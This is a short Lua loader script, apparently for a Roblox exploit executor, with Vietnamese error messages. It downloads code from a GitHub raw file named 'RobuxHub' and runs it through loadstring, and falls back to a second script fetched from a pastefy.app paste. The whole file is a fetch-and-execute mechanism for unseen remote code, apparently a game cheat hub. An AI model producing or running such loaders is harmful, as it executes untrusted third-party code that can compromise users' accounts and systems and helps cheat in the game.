
local function mainScript()
return loadstring(game:HttpGet("https://raw.githubusercontent.com/zdkjaime/PlsDonateHub/refs/heads/main/RobuxHub"))()
end

local function backupScript()
return loadstring(game:HttpGet("https://pastefy.app/0HSpDFKk/raw"))()
end

local success, errorMsg = pcall(mainScript)
if not success then
    print("Script chính lỗi: " .. errorMsg)
    success, errorMsg = pcall(backupScript)
    if not success then
        print("Script dự phòng lỗi: " .. errorMsg)
    end
end


print("💀")
